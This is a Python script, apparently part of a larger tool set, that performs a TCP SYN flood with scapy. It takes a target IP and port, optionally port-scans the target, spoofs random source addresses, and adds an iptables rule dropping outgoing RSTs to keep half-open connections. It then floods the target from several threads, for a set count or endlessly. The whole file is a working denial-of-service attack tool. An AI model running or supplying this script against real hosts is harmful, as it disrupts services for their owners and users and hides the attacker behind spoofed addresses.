import os
import sys
from utils.port_scan import port_scan_tcp
from utils.logger_util import get_logger
from utils.ifaces_util import get_ifaces

# set logger
logger = get_logger('tcp_flood_logger', './log/tcp_flood.log')

try:
    from scapy.all import *
except ImportError as e:
    try:
        os.system('sudo pip3 install scapy --proxy="http://10.50.128.110:3128"')
        logger.debug('scapy have been installed successfully! ! !')
        from scapy.all import *
    except Exception as e:
        logger.debug(f"======scapy installation failed======\n{e}\n")

from utils.thread_util_refactor import packThread

# verify that the user running the script is root
if os.getuid() != 0:
    logger.error('You need to run this program as root.')
    sys.exit(1)

# input the parameters to attack
send_pack_type = 'q'  # send a certain amount of packets
dst_ip = input('Input IP :')
tcp_port_type = input('Choose random or manual input dst port, please input r or m : ')
src_type = input('Choose random or local source ip, please input r or l : ')

# get the default gateway and nicname
ifaces_info = get_ifaces()
iface_ip = input('Please select the interface to send packets by inputting IP address:')
iface_name = ifaces_info[iface_ip][0]

logger.debug('The dst IP is %s, the interface used to send packets is %s.' % (dst_ip, iface_name))

# select the source IP type
src_ip = ""
if src_type == 'r' or src_type == 'R':
    src_ip = RandIP()
    logger.debug('The src IP uses random mode.')
elif src_type == 'l' or src_type == 'L':
    src_ip = iface_ip
    logger.debug('The src IP uses the local host IP.')

# define the dst port
tcp_port = ''
tcp_port_list = None
if tcp_port_type == "r" or tcp_port_type == "R":
    tcp_port_list = port_scan_tcp(dst_ip)
    if len(tcp_port_list) == 1:
        tcp_port = tcp_port_list[0]
        send_pack_type = input('Send packets way : infinite loop or quantitative, please input l or q : ')
    logger.debug('The dst port uses random mode.')
elif tcp_port_type == "m" or tcp_port_type == "M":
    tcp_port = input("Attack Port of SYN Flood :")
    logger.debug('The dst port uses manual input mode and port is %r' % (tcp_port))
    send_pack_type = input('Send packets way : infinite loop or quantitative, please input l or q : ')

# packet counts when sending a certain amount of packets
pack_count = 0
if send_pack_type == 'q' or send_pack_type == 'Q':
    pack_count = int(input('The total number of packets expected to be sent :'))

'''
By default the Linux kernel sends an RST in response to a SYN-ACK received from the server. 
This is because of a lack of communication between scapy and the kernel. 
For this reason an IPTABLES rule needs to be created to block any outgoing RST packets.
'''
try:
    os.system('iptables -A OUTPUT -p tcp -s %s --tcp-flags RST RST -j DROP' % src_ip)
except Exception as e:
    logger.debug(f"======iptables setup failed======\n{e}\n")

if __name__ == "__main__":
    logger.info('Sending packets, please wait a moment! ! !')
    if tcp_port_list == None or len(tcp_port_list) == 1:
        th = packThread(pack_count, src_ip, dst_ip, iface_name, logger, 'TCP', send_pack_type=send_pack_type)
        th.sendPackThread(tcp_port)
        if send_pack_type == 'q' or send_pack_type == 'Q':
            logger.info('%s packages has been sent to the port %s of %s! ! !' % (pack_count, tcp_port, dst_ip))
    else:
        th = packThread(pack_count, src_ip, dst_ip, iface_name, logger, 'TCP', port_list=tcp_port_list)
        if len(tcp_port_list) <= 5:
            th.portsThread(tcp_port_list)
        elif len(tcp_port_list) > 5:
            thread_num = 5
            rand_port_list = []
            for i in range(thread_num):
                rand_port = random.choice(tcp_port_list)
                rand_port_list.append(rand_port)
                tcp_port_list.remove(rand_port)
            logger.debug('The random dst port list is %r' % (rand_port_list))
            th.portsThread(rand_port_list)
